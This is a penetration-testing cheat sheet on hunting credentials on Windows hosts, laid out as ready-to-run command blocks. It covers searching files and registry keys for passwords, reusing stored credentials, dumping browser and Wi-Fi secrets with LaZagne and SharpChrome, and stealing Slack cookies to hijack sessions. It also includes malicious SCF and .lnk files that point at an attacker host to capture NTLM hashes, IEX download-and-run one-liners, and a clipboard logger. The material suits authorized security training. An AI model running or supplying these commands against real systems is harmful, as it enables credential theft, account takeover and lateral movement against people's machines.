# Credential Hunting

### Windows files

```shellscript
# Search in application configuration files => only prints the filename
# Delete /M to print the content 
findstr /SIM /R /C:"pass*" *.txt *.ini *.cfg *.config *.xml

# Search for file names containing the desired string 
dir /S /B *pass*
dir /S /B *cred*
dir /S /B *vnc*

# Search for file extensions, then look for the pattern inside those files
Get-ChildItem -Path C:\ -Force -Recurse -Include *.config, *.ini, *.xml, *.txt, *.cfg, *.rdp, *.creds, *.vnc, *.kdbx, *.vmdk, *.vdhx, *.ppk -ErrorAction Ignore | Where-Object { $_.FullName -notmatch 'Windows|System32|SysWOW64' } | Select-String -Pattern 'password' -ErrorAction Ignore

# Common installation files
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# Other files of interest 
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

### Stored credentials

```shellscript
# Listing stored credentials => Users may wish to store credentials for a specific host 
# or use it to store credentials for terminal services connections to connect to a remote
# host using Remote Desktop without needing to enter a password
cmdkey /list

# We can then try to connect to the host with RDP, or reuse them with runas
# Runas will give us a shell as that user
runas /savecred /user:<DOMAIN>\<USER> "<COMMAND>"
```

If we have the password of the user who has the stored credentials, we can attempt to get the stored password.

{% embed url="https://app.gitbook.com/o/OzCeXZoR6hIZ3S7aPLrj/s/d1x5yxrrjMQ55ObqBQ44/~/edit/~/changes/2/others/credential-dumping/dpapi" %}

### Powershell

```shellscript
# Print the content of the powershell history file
nxc smb <IP> -u <USER> -p <PASSWORD> -M powershell_history -o export=True

Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
gc (Get-PSReadLineOption).HistorySavePath
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

# Powershell credentials

# If we find the following script
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword

# Decrypt powershell credentials if we have gained command exec in the context of this
# user, or can abuse DPAPI
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

When getting a shell as a user, there may be scheduled tasks or other processes being executed which pass credentials on the command line.

```ps1
# Script to get process command lines
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}

# Run it on the target
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

### Chrome

```shellscript
# Search in chrome dictionnary 
gc 'C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

# Get chrome browser credentials
https://github.com/GhostPack/SharpDPAPI
.\SharpChrome.exe logins /unprotect
```

### Sticky notes DB

```shellscript
# Looking for sticky notes DB files
# Located in C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
https://github.com/RamblingCookieMonster/PSSQLite
Set-ExecutionPolicy Bypass -Scope Process
cd .\PSSQLite\
Import-Module .\PSSQLite.psd1
$db = '<PATH_TO_PLUM.SQLITE>'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

# Or copy to linux and dump
sqlite3 plum.sqlite .dump
```

### Registries

```shellscript
# Windows auto logon => enables to log in as a user without user and 
# pass, as they will be stored in clear text in a registry => accessible by standard user
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Putty => creds stored in clear text 
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>

# Enumerate the available sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

# Look for creds in that session
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

### Wifi

```shellscript
netsh wlan show profile
netsh wlan show profile <PROFILE> key=clear
```

### Traffic capture

If `wireshark` / `tcpdump` is installed on a box we land on, it is worth attempting a traffic capture to see if we can pick up some clear text passwords.

The tool below allows us to sniff passwords from a pcap file

### Tools

```shellscript
# If we have domain access with a host who has Microsoft Exchange inbox
# We can search the user's email for patterns like pass, creds etc 
https://github.com/dafthack/MailSniper
Invoke-SelfSearch -Mailbox current-user@domain.com

# Attempt to retreive credentials from a wide variety of softwares
https://github.com/AlessandroZ/LaZagne
.\lazagne.exe all

# Attempt to retreive credentials from PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP 
https://github.com/Arvanaghi/SessionGopher
Import-Module .\SessionGopher.ps1

# PowerSploit commands
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```

### Capturing hashes

The following tool will craft all possible file types that can steal hashes. It is useful when there is a blacklist restricting the file types we can upload.

```shellscript
python3 ntlm_theft.py -g all -s <ATTACKER_IP> -f <NAME>
```

#### SCF on a file share

A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as Responder, Inveigh, or InveighZero, we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation. We may be able to capture a user's password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.

```shellscript
# Malicious SCF file => call it @Inventory.scf (similar to another file in the dir)
# Important to leave the @, so it appears at the top of the dir and is executed first
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\<SHARE>\legit.ico
[Taskbar]
Command=ToggleDesktop

# Start responder => We will get the hash when the file is executed
sudo responder -wrf -v -I tun0

# Crack the hash
hashcat -m 5600 hash <WORDLIST>
```

{% hint style="warning" %}
Using SCFs no longer works on Server 2019 hosts, use .lnk files
{% endhint %}

#### .lnk file

Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file. We can use various tools to generate a malicious .lnk file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious .scf file.

We can also make one using a few lines of PowerShell

```shellscript
# Create a .lnk file 
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

### Collecting cookies

Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles<RANDOM>.default-release`. There's a piece of the file that is random, and we can use a wildcard in PowerShell to copy the file content.

```shellscript
# Copy firefox cookie database
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .

# Extract Slack cookie from the firefow cookie DB
https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

# Go to Slack.com and add / modify your navigator cookie named d with the content of the
# one extracted from above. Every time the app asks us some creds, inject the cookie

# If the navigator is Chromium based, the cookies are stored and encrypted using DPAPI
 https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
 Invoke-SharpChromium -Command "cookies slack.com"
 
 # If we get an error, it might be because the path to the cookies is hardcoded into the 
 # tool and does not match our version installed. SharpChromium is looking for a file in
 # %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies, but the actual file is located
 # in %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies
 
 # Copy the cookies to the desired location 
 copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
 
 # Run the tool again
 Invoke-SharpChromium -Command "cookies slack.com"
```

### Clipboard

In many companies, network administrators use password managers to store their credentials and copy and paste passwords into login forms. As this doesn't involve typing the passwords, keystroke logging is not effective in this case. The clipboard provides access to a significant amount of information, such as the pasting of credentials and 2FA soft tokens, as well as the possibility to interact directly with the RDP session clipboard

```shellscript
# The script will start to monitor for entries in the clipboard and present them in the 
# PowerShell session. We need to be patient and wait until we capture sensitive 
# information
https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```

### Backup systems

If we gain access to a `backup system`, we may be able to review backups, search for interesting hosts and restore the data we want.

To start working with `restic`, we must create a `repository` (the directory where backups will be stored). `Restic` checks if the environment variable `RESTIC_PASSWORD` is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.

We will use `restic 0.13.1` and back up the repository `C:\xampp\htdocs\webapp` in `E:\restic\` directory. To download the latest version of restic :

```shellscript
# Create and initialize the location where our backup will be saved, called the repository
mkdir E:\restic2; restic.exe -r E:\restic2 init

# Back up a dir 
$env:RESTIC_PASSWORD = 'Password'
restic.exe -r E:\restic2\ backup C:\SampleFolder

# If we want to backup a dir where files are actively used (like C:\Windows)
# If the user doesn't have the rights to access or copy the content of a directory, we 
# may get an Access denied message. The backup will be created, but no content will be 
# found
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

# Check backups saved in a repository
restic.exe -r E:\restic2\ snapshots

# Restore a backup with ID
restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```

We need to understand our targets and what kind of information we are looking for. If we find a backup for a Linux machine, we may want to check files like `/etc/shadow` to crack users' credentials, web configuration files, `.ssh` directories to look for SSH keys, etc.

If we are targeting a Windows backup, we may want to look for the `SAM` & `SYSTEM` hive to extract local account hashes. We can also identify web application directories and common files where credentials or sensitive information is stored, such as web.config files. Our goal is to look for any interesting files that can help us achieve our goal.

### User / Computer Description Field

Though more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field

```shellscript
# Check local user for Description fields 
Get-LocalUser

# Check computer description field
Get-WmiObject -Class Win32_OperatingSystem | select Description

# With PowerView
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

# Testing for PASSWD_NOTREQD field => means the user is not subject to the password policy
# or that he has an empty password
# With PowerView
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### Shares

```shellscript
# Check for passwords stored in scripts in the SYSVOL share
ls \\<DC>\SYSVOL\INLANEFREIGHT.LOCAL\scripts

# Check for the Groups.xml file in the SYSVOL share
```

{% embed url="https://app.gitbook.com/o/OzCeXZoR6hIZ3S7aPLrj/s/d1x5yxrrjMQ55ObqBQ44/~/edit/~/changes/2/others/credential-dumping/network-shares" %}
